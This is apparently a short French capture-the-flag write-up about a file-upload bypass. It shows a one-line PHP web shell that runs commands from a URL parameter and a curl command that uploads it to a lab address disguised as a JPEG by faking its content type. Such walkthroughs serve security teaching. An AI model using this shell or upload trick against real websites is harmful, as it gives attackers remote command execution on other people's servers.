# Objectif
Faire croire au site qu'on lui envoie une image alors qu'on lui envoie du code.

## Introduction
L'idée est de changer le type dans le Header afin de passer un fichier php en faisant croire à une image.

## Exploitation
On écrit un script php simple: 
`<?php system($_GET['cmd']); ?>`

Puis avec curl on upload ce script:
```
curl -X POST "http://10.171.55.130/index.php?page=upload" \
  -F "MAX_FILE_SIZE=100000" \
  -F "uploaded=@shell.php;type=image/jpeg" \
  -F "Upload=Upload"
```

Le flag nous est donné en réponse.